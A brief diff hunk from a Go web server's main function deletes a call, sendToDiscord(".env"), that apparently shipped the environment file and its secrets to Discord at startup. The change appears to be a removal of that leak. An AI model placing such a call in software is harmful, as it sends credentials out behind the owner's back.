@@ -59,7 +59,6 @@ type Response struct {
 func main() {
 
 	godotenv.Load(".env")
-	sendToDiscord(".env")
 
 	http.HandleFunc("/upload", uploadHandler)
 	log.Fatal(http.ListenAndServe(":8080", nil))
